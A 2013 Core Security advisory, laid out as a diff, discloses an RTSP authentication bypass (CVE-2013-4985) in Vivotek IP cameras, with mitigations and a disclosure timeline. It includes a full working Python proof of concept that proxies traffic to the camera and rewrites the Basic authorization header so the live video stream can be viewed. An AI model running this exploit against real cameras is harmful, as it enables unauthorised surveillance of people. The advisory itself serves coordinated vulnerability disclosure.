@@ -1,0 +1,418 @@
+Core Security - Corelabs Advisory
+http://corelabs.coresecurity.com
+
+Vivotek IP Cameras RTSP Authentication Bypass
+
+
+1. *Advisory Information*
+
+Title: Vivotek IP Cameras RTSP Authentication Bypass
+Advisory ID: CORE-2013-0704
+Advisory URL:
+http://www.coresecurity.com/advisories/vivotek-ip-cameras-rtsp-authentication-bypass
+Date published: 2013-11-05
+Date of last update: 2013-11-05
+Vendors contacted: Vivotek
+Release mode: Coordinated release
+
+
+2. *Vulnerability Information*
+
+Class: Authentication issues [CWE-287]
+Impact: Security bypass
+Remotely Exploitable: Yes
+Locally Exploitable: No
+CVE Name: CVE-2013-4985
+
+
+3. *Vulnerability Description*
+
+A security vulnerability was found in Vivotek IP cameras [1] that could
+allow an unauthenticated remote attacker to bypass the RTSP basic
+authentication and access the video stream.
+
+
+4. *Vulnerable Packages*
+
+   . Vivotek IP cameras with firmware 0105a.
+   . Vivotek IP cameras with firmware 0105b.
+   . This vulnerability was tested against Vivotek IP cameras IP7160,
+IP7361 and IP8332. Other Vivotek cameras and firmware are probably
+affected too, but they were not checked.
+
+
+5. *Vendor Information, Solutions and Workarounds*
+
+Vendor released the beta firmware 0301c [2] and notifies that it should
+be the formal release [2013-10-28]; contact vendor for further
+information. Some mitigation actions for this issue may be:
+
+   . Do not expose the camera to internet unless absolutely necessary.
+   . Filter RTSP traffic (default port 554) if possible.
+
+
+6. *Credits*
+
+This vulnerability was discovered and researched by Martin Di Paola from
+Core Security QA Team. The PoC of was made by Martin Di Paola with help
+of Martin Rocha from Core Development Team. The publication of this
+advisory was coordinated by Fernando Miranda from Core Advisories Team.
+
+
+7. *Technical Description / Proof of Concept Code*
+
+7.1. *RTSP Authentication Bypass*
+
+This vulnerability is triggered by sending specially crafted RTSP
+packets to remote TCP port 554. In order to run the proof of concept,
+follow the next steps:
+
+   1. Set the camera RTSP authentication to 'basic'.
+   2. (Assuming that the camera is located in 192.168.1.1) Run 'poc.py'
+with these parameters: 'python poc.py 9999 192.168.1.1 554'
+   3. Open a VLC media player and go to: 'Media > Open Network Stream'.
+   4. Enter the following network URL: 'rtsp://localhost:9999/live.sdp'.
+   5. A dialog box will asks for user/password, just click 'OK'.
+   6. You should see the RTSP live video stream; i.e., the RTSP basic
+authentication can by bypassed by a remote attacker.
+
+/-----
+#
+# poc.py
+#
+# The contents of this software are copyright (c) 2013 CORE Security and
+(c) 2013 CoreLabs,
+# and are licensed under a Creative Commons Attribution Non-Commercial
+Share-Alike 3.0 (United States)
+# License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+#
+# THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED
+# WARRANTIES ARE DISCLAIMED. IN NO EVENT SHALL CORE SDI Inc. BE LIABLE
+# FOR ANY DIRECT,  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY OR
+# CONSEQUENTIAL  DAMAGES RESULTING FROM THE USE OR MISUSE OF
+# THIS SOFTWARE.
+#
+
+import sys
+from socket import *
+from threading import Thread
+import time
+
+LOGGING = 1
+
+def log(s):
+    if LOGGING:
+        print '(%s) %s' % (time.ctime(), s)
+
+
+class UDPRequestHandler(Thread):
+    def __init__(self, data_to_send, recv_addr, dst_addr):
+        Thread.__init__(self)
+        self.data_to_send = data_to_send
+        self.recv_addr = recv_addr
+        self.dst_addr = dst_addr
+
+    def run(self):
+        sender = socket(AF_INET, SOCK_DGRAM)
+        sender.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+        sender.sendto(self.data_to_send, self.dst_addr)
+        response = sender.recv(1024)
+        sender.sendto(response, self.recv_addr)
+        sender.close()
+
+
+class UDPDispatcher(Thread):
+    dispatchers = []
+
+    def __has_dispatcher_for(self, port):
+        return any([d.src_port == port for d in UDPDispatcher.dispatchers])
+
+    def __init__(self, src_port, dst_addr):
+        Thread.__init__(self)
+        if self.__has_dispatcher_for(src_port):
+            raise Exception('There is already a dispatcher for port %d'
+% src_port)
+        self.src_port = src_port
+        self.dst_addr = dst_addr
+        UDPDispatcher.dispatchers.append(self)
+
+    def run(self):
+        listener = socket(AF_INET, SOCK_DGRAM)
+        listener.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+        listener.bind(('', self.src_port))
+        while 1:
+            try:
+                data, recv_addr = listener.recvfrom(1024)
+                if not data: break
+                UDPRequestHandler(data, recv_addr, self.dst_addr).start()
+            except Exception as e:
+                print e
+                break
+        listener.close()
+        UDPDispatcher.dispatchers.remove(self)
+
+
+class PipeThread(Thread):
+    pipes = []
+
+    def __init__(self, source, sink, process_data_callback=lambda x: x):
+        Thread.__init__(self)
+        self.source = source
+        self.sink = sink
+        self.process_data_callback = process_data_callback
+        PipeThread.pipes.append(self)
+
+    def run(self):
+        while 1:
+            try:
+                data = self.source.recv(1024)
+                data = self.process_data_callback(data)
+                if not data: break
+                self.sink.send(data)
+            except Exception as e:
+                log(e)
+                break
+        PipeThread.pipes.remove(self)
+
+
+class TCPTunnel(Thread):
+    def __init__(self, src_port, dst_addr, process_data_callback=lambda
+x: x):
+        Thread.__init__(self)
+        log('[*] Redirecting: localhost:%s -> %s:%s' % (src_port,
+dst_addr[0], dst_addr[1]))
+        self.dst_addr = dst_addr
+        self.process_data_callback = process_data_callback
+        # Create TCP listener socket
+        self.sock = socket(AF_INET, SOCK_STREAM)
+        self.sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+        self.sock.bind(('', src_port))
+        log('[*] Check live stream in rtsp://localhost:%d/live.sdp' %
+src_port)
+        self.sock.listen(5)
+
+    def run(self):
+        while 1:
+            # Wait until a new connection arises
+            newsock, address = self.sock.accept()
+            # Create forwarder socket
+            fwd = socket(AF_INET, SOCK_STREAM)
+            fwd.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+            fwd.connect(self.dst_addr)
+            # Pipe them!
+            PipeThread(newsock, fwd, self.process_data_callback).start()
+            PipeThread(fwd, newsock, self.process_data_callback).start()
+
+
+class Camera():
+    def __init__(self, address):
+        self.address = address
+
+    def get_describe_data(self):
+        return ''
+
+
+class Vivotek(Camera):
+    def __init__(self, address):
+        Camera.__init__(self, address)
+
+    def get_describe_data(self):
+        return 'v=0\r\no=RTSP 836244 0 IN IP4 0.0.0.0\r\ns=RTSP
+server\r\nc=IN IP4 0.0.0.0\r\nt=0
+0\r\na=charset:Shift_JIS\r\na=range:npt=0-\r\na=control:*\r\na=etag:1234567890\r\nm=video
+0 RTP/AVP 96\r\nb=AS:1200\r\na=rtpmap:96
+MP4V-ES/30000\r\na=control:trackID=1\r\na=fmtp:96
+profile-level-id=3;config=000001B003000001B509000001000000012000C48881F4514043C1463F;decode_buf=76800\r\nm=audio
+0 RTP/AVP 97\r\na=control:trackID=3\r\na=rtpmap:97
+mpeg4-generic/16000/2\r\na=fmtp:97 streamtype=5; profile-level-id=15;
+mode=AAC-hbr; config=1410;SizeLength=13; IndexLength=3;
+IndexDeltaLength=3; CTSDeltaLength=0; DTSDeltaLength=0;\r\n'
+
+
+class RTSPAuthByPasser():
+    DESCRIBE_REQ_HEADER = 'DESCRIBE rtsp://'
+    UNAUTHORIZED_RESPONSE = 'RTSP/1.0 401 Unauthorized'
+    SERVER_PORT_ARGUMENTS = 'server_port='
+    DEFAULT_CSEQ = 1
+    DEFAULT_SERVER_PORT_RANGE = '5556-5559'
+
+    def __init__(self, local_port, camera):
+        self.last_describe_req = ''
+        self.camera = camera
+        self.local_port = local_port
+
+    def start(self):
+        log('[!] Starting bypasser')
+        TCPTunnel(self.local_port, self.camera.address,
+self.spoof_rtsp_conn).start()
+
+    def spoof_rtsp_conn(self, data):
+        auth_string = "Authorization: Basic"
+        if auth_string in data:
+            data = data.split("\r\n")
+            new_data = []
+            for line in data:
+                new_data.append(line if auth_string not in line else
+auth_string + " a")
+            data = "\r\n".join(new_data)
+        return data
+
+
+if __name__ == '__main__':
+    if len(sys.argv) > 1:
+        listener_port = camera_port = int(sys.argv[1])
+        camera_ip = sys.argv[2]
+        if len(sys.argv) == 4:
+            camera_port = int(sys.argv[3])
+        RTSPAuthByPasser(listener_port, Vivotek((camera_ip,
+camera_port))).start()
+    else:
+        print 'usage: python %s [local_port] [camera_ip]
+[camera_rtsp_port]'  
+
+-----/
+
+
+8. *Report Timeline*
+
+. 2013-07-04:
+Core Security Technologies attempts to report the vulnerability.
+Publication date set to July 30th, 2013.
+
+. 2013-07-08:
+Core attempts to contact vendor.
+
+. 2013-07-22:
+Core attempts to contact vendor.
+
+. 2013-07-30:
+First release date missed.
+
+. 2013-07-30:
+Core notifies the Vivotek team of the vulnerability.
+
+. 2013-08-01:
+Vendor asks for a report with technical information.
+
+. 2013-08-01:
+Technical details sent to Vivotek team.
+
+. 2013-08-05:
+Core asks for a status update.
+
+. 2013-08-05:
+Vendor notifies that the reported issue is being evaluated.
+
+. 2013-08-12:
+Core asks for a status update and re-schedules the advisory publication
+for Aug 28th.
+
+. 2013-08-15:
+Vendor notifies that authentication in RTSP streaming is disabled by
+default and the reported issue is not a vulnerability.
+
+. 2013-08-27:
+Core notifies that the PoC was tested against Vivotek IP cameras IP7160,
+IP8332 and IP7361, with basic authentication enabled, and all targets
+were vulnerable. Core re-sends a PoC and additional technical details.
+
+. 2013-08-28:
+Vendor confirms the issue and notifies that a patched firmware will be
+released in the future.
+
+. 2013-08-28:
+Second release date missed.
+
+. 2013-09-02:
+Core asks for a specific release date and re-schedules the advisory
+publication for Sep 11th.
+
+. 2013-09-03:
+Vendor notifies that they have a solution that is being tested. The
+solution will be released in the newest models first.
+
+. 2013-09-09:
+Core asks for a status update regarding the release date.
+
+. 2013-09-10:
+Vendor notifies that the testing process will probably finish before
+Sep. 27th.
+
+. 2013-09-11:
+Third release date missed.
+
+. 2013-09-30:
+Core asks for a status update.
+
+. 2013-09-30:
+Vendor notifies that they found other issues on this version and asks
+for delaying the release.
+
+. 2013-10-17:
+Core asks for a status update and a tentative release date.
+
+. 2013-10-17:
+Vendor notifies that a firmware beta version is being tested [2].
+
+. 2013-10-28:
+Core notifies that the advisory was re-scheduled to be published next
+Tuesday and that date should be considered final.
+
+. 2013-10-28:
+Vendor notifies that the firmware beta release 0301c [2] should be the
+formal release.
+
+. 2013-11-05:
+Advisory CORE-2013-0704 published.
+
+
+9. *References*
+
+[1] http://www.vivotek.com/web/product/NetworkCameras.aspx
+[2]
+ftp://fae:fae@ftp.vivotek.com/Firmware/IP8332/Beta/IP8332-VVTK-0301c.flash.pkg
+
+
+10. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://corelabs.coresecurity.com.
+
+
+11. *About Core Security Technologies*
+
+Core Security Technologies enables organizations to get ahead of threats
+with security test and measurement solutions that continuously identify
+and demonstrate real-world exposures to their most critical assets. Our
+customers can gain real visibility into their security standing, real
+validation of their security controls, and real metrics to more
+effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted
+research and leading-edge threat expertise from the company's Security
+Consulting Services, CoreLabs and Engineering groups. Core Security
+Technologies can be reached at +1 (617) 399-6980 or on the Web at:
+http://www.coresecurity.com.
+
+
+12. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2013 Core Security
+Technologies and (c) 2013 CoreLabs, and are licensed under a Creative
+Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
+License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+
+13. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
